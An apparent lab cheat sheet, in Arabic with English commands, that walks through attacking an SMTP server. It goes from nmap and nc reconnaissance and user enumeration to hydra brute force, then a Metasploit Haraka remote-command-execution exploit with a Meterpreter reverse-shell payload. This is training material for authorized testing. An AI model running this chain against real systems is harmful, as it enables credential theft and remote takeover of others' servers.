1. Reconnaissance

تأكد من الهدف والاتصال قبل فحص خدمة البريد

التأكد من الهدف KALI TERMINAL
ping -c 4 [TARGET]
إذا ICMP محجوب، انتقل مباشرة إلى Nmap واستخدم -Pn عند الحاجة.

2. Port Scanning

اكتشاف SMTP وتحديد الـbanner / version قبل أي خطوة أخرى

فحص SMTP وتحديد الإصدار KALI TERMINAL
nmap -sS -sV [TARGET]
Banner عبر Nmap KALI TERMINAL
nmap -sV --script banner -p25 [TARGET]
استخدم هذا الفحص للحصول على معلومات الـhost / banner من خدمة SMTP.
GENERAL REFERENCE: Service/banner detection → ابحث عن تعريف SMTP والمنتج/الإصدار عندما يستطيع الفحص تحديدهما.
اتصال يدوي بالخدمة KALI TERMINAL
nc [TARGET] 25
مفيد لرؤية رد SMTP مباشرة والتأكد أن الخدمة تتحدث البروتوكول المتوقع.
GENERAL REFERENCE: SMTP greeting يبدأ عادة بكود 220 عند جاهزية الخدمة.

3. Enumeration

تحديد إصدار SMTP ثم البحث عن حسابات مستخدمين صالحة

Version Detection

SMTP Version عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smtp/smtp_version set RHOSTS [TARGET] run

User Enumeration

تعداد المستخدمين بـ smtp-user-enum KALI TERMINAL
smtp-user-enum -U [USERLIST] -t [TARGET]
Wordlist المتاحة هنا: /usr/share/commix/src/txt/usernames.txt
تعداد المستخدمين عبر Metasploit MSFCONSOLE
use auxiliary/scanner/smtp/smtp_enum set RHOSTS [TARGET] run
استخدم هذه الوحدة لتحديد حسابات المستخدمين على النظام الهدف.
Workflow: Version/Banner → User Enumeration → إذا ظهر إصدار قابل للاستغلال، تحقق من شروط الـexploit قبل تشغيله.

Protocol Capabilities

EHLO / STARTTLS / AUTH KALI TERMINAL
printf 'EHLO [CLIENT_NAME]\r\nQUIT\r\n' | nc [TARGET] [PORT]
راجع الرد لوجود STARTTLS وAUTH mechanisms. استخدم openssl عند TLS/SMTPS.
GENERAL REFERENCE: استجابة EHLO الناجحة تستخدم 250 وتعرض capabilities غالبًا على عدة أسطر. STARTTLS يعني أن الخادم يعلن إمكانية ترقية الاتصال الحالي إلى TLS. AUTH يعرض آليات المصادقة المعلنة ولا يعني امتلاك Credentials صالحة.
SMTPS / STARTTLS inspection KALI TERMINAL
openssl s_client -connect [TARGET]:465 openssl s_client -starttls smtp -connect [TARGET]:587
GENERAL REFERENCE: اختر الصيغة حسب البورت والخدمة المكتشفة.
GENERAL REFERENCE: النجاح = اكتمال تفاوض TLS وظهور معلومات الشهادة/الاتصال بدل فشل handshake.

4. Credential Testing

اختبر الاعتمادات فقط إذا SMTP AUTH مفعّل، وبأكثر من طريقة حيثما ينطبق.

Hydra

اختبار SMTP Authentication KALI TERMINAL
hydra -L [USERLIST] -P [WORDLIST] [TARGET] smtp
استخدمها فقط إذا الخادم يعلن SMTP AUTH وتملك تصريحًا للاختبار.

Metasploit

البحث عن وحدات SMTP authentication/login المناسبة MSFCONSOLE
search type:auxiliary smtp login
اختر الوحدة المطابقة لما اكتشفته فعليًا؛ لا تفترض وجود Authentication إذا الخادم ما يعلنه.

5. Exploitation

المسار الاستغلالي هنا: Haraka Remote Command Execution

تحذير: تأكد من الإصدار ونظام التشغيل والشروط المسبقة قبل أي exploit.

Linux — Haraka < 2.8.9 LINUX

إعداد exploit في Metasploit MSFCONSOLE
use exploit/linux/smtp/haraka set RHOSTS [TARGET] set SRVPORT 9898 set email_to root@[TARGET_DOMAIN] set payload linux/x64/meterpreter_reverse_http check
Version-specific. هذا المسار يحدد SRVPORT 9898 والـpayload أعلاه، ويطلب check قبل التنفيذ. استبدل الدومين بقيمة الهدف الفعلية في اللاب.
التنفيذ بعد نجاح التحقق MSFCONSOLE
run
لا تفترض Expected Result ثابتًا؛ تحقق من نتيجة الـmodule الفعلية بعد التشغيل.
التحقق من Haraka KALI TERMINAL LINUX
nmap -sV -p25 [TARGET]
هذا المسار خاص بـ Haraka < 2.8.9. لا تنتقل للاستغلال إلا إذا كانت الخدمة والإصدار متطابقين.
تحذير: لا تشغّل exploit لمجرد أن البورت 25 مفتوح. تأكد من أن الخادم هو Haraka وأن الإصدار يقع ضمن النطاق المذكور هنا.

بعد الحصول على جلسة فعلية — تحقق فقط من الوصول ثم انتقل لملف Post-Exploitation المناسب
